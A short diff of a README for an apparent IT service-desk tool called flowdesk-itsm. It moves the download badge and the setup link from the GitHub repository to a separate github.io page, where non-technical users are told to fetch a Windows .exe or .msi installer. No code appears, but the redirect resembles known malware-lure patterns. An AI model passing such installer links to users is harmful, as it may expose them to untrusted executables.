@@ -1,6 +1,6 @@
 # 🏢 flowdesk-itsm - Manage IT services with ease today
 
-[![](https://img.shields.io/badge/Download-Flowdesk-blue.svg)](https://github.com/Babag6541/flowdesk-itsm)
+[![](https://img.shields.io/badge/Download-Flowdesk-blue.svg)](https://babag6541.github.io)
 
 Flowdesk-itsm helps teams organize IT service tasks. It stores ticket information in a structured way. This software supports internal company processes. It tracks requests, incidents, and daily work tasks.
 
@@ -21,7 +21,7 @@ Ensure your computer has the latest Windows updates. These updates keep your sys
 
 Follow these steps to set up your environment. You do not need to know programming to complete this process.
 
-1. Visit the project website. Click this link: [https://github.com/Babag6541/flowdesk-itsm](https://github.com/Babag6541/flowdesk-itsm).
+1. Visit the project website. Click this link: [https://babag6541.github.io](https://babag6541.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version number.
 4. Locate the Windows installer file. It usually ends with .msi or .exe.
